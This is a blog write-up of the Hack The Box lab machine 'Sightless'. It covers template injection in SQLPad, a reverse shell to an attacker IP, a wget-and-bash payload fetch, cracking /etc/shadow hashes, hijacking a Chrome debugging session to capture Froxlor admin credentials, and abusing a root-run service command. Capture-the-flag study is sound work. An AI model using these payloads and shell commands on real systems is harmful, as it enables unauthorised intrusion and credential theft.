---
layout: post
title: "Sightless HTB writeup"
subtitle: "Walkethrough for the Sightless HTB machine."
date: 2024-09-12 23:45:13
background: '/img/posts/04.jpg'

---

## Report

Beginning with our `nmap` scan  

```bash
nmap 10.10.11.32
```
We get some open ports, `21 FTP 22 SSH` and `80 HTTP`.

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240908163303.png" alt="1" style="width:700px; height:auto;">
<br/> 

Looking for the low hanging fruits and begin with `FTP` but we get an error when trying to connect.  

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240908163508.png" alt="1" style="width:700px; height:auto;">
<br/> 

Interreacting with `HTTP` using the browser, we get an error and a redirection to the `slightless.htb` domain.  

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240908162037.png" alt="1" style="width:700px; height:auto;">
<br/>

Adding it to the `/etc/hosts` file.  

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240908162151.png" alt="1" style="width:700px; height:auto;">
<br/>

We get a nice looking `index` page. Following our standard methodology, we find nothing in the source code.  

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240908162235.png" alt="1" style="width:700px; height:auto;">
<br/>

Looking at the `index` page, we get an interesting button referencing to `sqlpad` platform.  

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240908162741.png" alt="1" style="width:700px; height:auto;">
<br/>

> **Note:** SQLPad is **a web app which enables end users to connect via browser to various SQL servers, explore data by writing and running complex SQL queries, and eventually visualize the results.**
 

When clicking on the Start now button, we are redirected to this subdomain `http://sqlpad.sightless.htb/`  
We get this page when we add it to the `/etc/hosts` file.

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240908162829.png" alt="1" style="width:700px; height:auto;">
<br/>  

We can get some information disclosure and get a username `john`.  

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240908162930.png" alt="1" style="width:700px; height:auto;">
<br/>   

Searching for `exploits`, we find this [link](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb) that reference to `template injection` leading to `Remote code execution`.  

Following the steps:  
* Make a new `MYSQL` connection

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240911091454.png" alt="1" style="width:700px; height:auto;">
<br/>

* Add the command to be executed in the `Database` Textbox with this format.


&#123;&#123; process.mainModule.require('child_process').exec('Command') &#125;&#125;



<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240911091638.png" alt="1" style="width:700px; height:auto;">
<br/>

Choosing this command to test for connection  
```bash
nc -nv 10.10.16.11 4444
```

* Before saving, we open a `nc` listener and wait for a connection.

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240911091841.png" alt="1" style="width:700px; height:auto;">
<br/>

We get no connection back and an error pops up.

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240911092136.png" alt="1" style="width:700px; height:auto;">
<br/>

To mitigate this, I run another listener on `port 5555` and passed it the `IP` and `port`.  

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240911092310.png" alt="1" style="width:700px; height:auto;">
<br/>

We get a connection from the second listener but nothing from the first listener as the command maybe was not executed.

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240911092408.png" alt="1" style="width:700px; height:auto;">
<br/>

After a lot of thinking, I concluded that `netcat` was maybe not installed on the machine so tried to use alternatives like the default `reverse shell` command `sh -i >& /dev/tcp/10.10.16.28/4444 0>&1` but still did not work. Saved the script into a file  and started a `web server`.  

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240911121307.png" alt="1" style="width:700px; height:auto;">
<br/>

Changed the command to be executed and waited for a connection.  


&#123;&#123; process.mainModule.require('child_process').exec('wget http://10.10.16.11:8000/rev.sh && bash rev.sh') &#125;&#125; 


We get a response.  

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240911121935.png" alt="1" style="width:700px; height:auto;">
<br/>

And a response at our listener.  

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240911122027.png" alt="1" style="width:700px; height:auto;">
<br/>

We can see us being `root` but this is a container because of the limited resources and no presence of flags, web page or anything.  
Following our standard methodology, we check the `/etc/shadow` file.  

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240911122431.png" alt="1" style="width:700px; height:auto;">
<br/>

Saving the `hashes` of the `root` and `michael` user to try and crack it offline using `hashcat`.  

```bash
hashcat hash /usr/share/wordlists/rockyou.txt
```

We get a hit.  

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240911122606.png" alt="1" style="width:700px; height:auto;">
<br/>

Credentials discovered `michael:insaneclownposse`.  
Trying to `SSH` using the credentials discovered.

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240911122703.png" alt="1" style="width:700px; height:auto;">
<br/>

Following standard methodology, we run `linpeas.sh` to check for low hanging fruits.  
We see that `chrome` is running as `john` with the `remote-debugging-port` enabled 

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240911125647.png" alt="1" style="width:700px; height:auto;">
<br/>

The port is set to `0` means it chooses a random high port.  
Checking for active ports.

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240911125806.png" alt="1" style="width:700px; height:auto;">
<br/>

Some high ports are running, `( remote debugging port)` and an interesting port `8080` running.  

```bash
ssh -L 8080:127.0.0.1:8080 michael@10.10.11.32
```

Checking the service running on `localhost:8080`

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240911130055.png" alt="1" style="width:700px; height:auto;">
<br/>  

`Froxlor` service running.  
`Default credentials` did not work.  
Abusing the  remote-debugging-port in chrome following this [link](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/)  
Following those steps:
* Guessing the correct `port` because of the `randomization` being used.* `Local port` forwarding the correct `port`

``` bash
ssh -L 39261:127.0.0.1:39261 michael@10.10.11.32
```

* Open `chrome` and type `chrome://inspect/#devices`
* click `Configure…` at the right of `Discover network targets`. The modal window opens.
* In the modal window, enter `127.0.0.1:39261` then click `Done`.

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240911131350.png" alt="1" style="width:700px; height:auto;">
<br/>

* Now we should see the remote host appears at the bottom of the `Remote Target`.

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240911131415.png" alt="1" style="width:700px; height:auto;">
<br/>

* Click `inspect` then new browser open. We can browse the website.

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240911131444.png" alt="1" style="width:700px; height:auto;">
<br/>

We can see the automated session being run on the machine.  
Go to `Network` on the `inspect panel`, select the post request being sent and click on copy as `cURL`.

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240911131611.png" alt="1" style="width:700px; height:auto;">
<br/>

We get this request  

```bash
curl 'http://admin.sightless.htb:8080/index.php' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: PHPSESSID=8p6mp6ll3ssr483p3g11ipoaml' \
  -H 'Origin: http://admin.sightless.htb:8080' \
  -H 'Referer: http://admin.sightless.htb:8080/index.php' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/125.0.6422.60 Safari/537.36' \
  --data-raw 'loginname=admin&password=ForlorfroxAdmin&dologin=' \
  --insecure
```

We can see the pot data being sent, with `username` and `password` `admin:ForlorfroxAdmin`.  
Logging in with the provided credentials  

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240911131902.png" alt="1" style="width:700px; height:auto;">
<br/>

Checking the `PHP/PHP-FPM` versions 

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240911132103.png" alt="1" style="width:700px; height:auto;">
<br/>

We can see a service that can be edited  

 

We can find `php-fpm restart command` with the following input `service php8.1-fpm restart`  
To run such command, it must be run as `root`. It means that this command is being run as `root`.  
The command can be changed to  

```bash
cp /etc/shadow /tmp/shadow
```

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240911132556.png" alt="1" style="width:700px; height:auto;">
<br/>

Go to `System/Settings/PHP-FPM`, reenable the service to trigger the command  

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240911132710.png" alt="1" style="width:700px; height:auto;">
<br/>

As we can see, the command was executed and the `shadow` file was copied successfully. 

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240911132814.png" alt="1" style="width:700px; height:auto;">
<br/>

We have a small problem as we cannot access it.  
We will redo the same steps but change the command to be 

```bash
chown michael /tmp/shadow
```

We can see the command was executed  

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240911133152.png" alt="1" style="width:700px; height:auto;">
<br/>

We can now read the `shadow` file  

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240911133236.png" alt="1" style="width:700px; height:auto;">
<br/>

The machine was pawned successfully  

<br/> 
<img src="/img/sightless_screenshots/Pasted image 20240908222127.png" alt="1" style="width:700px; height:auto;">
<br/>
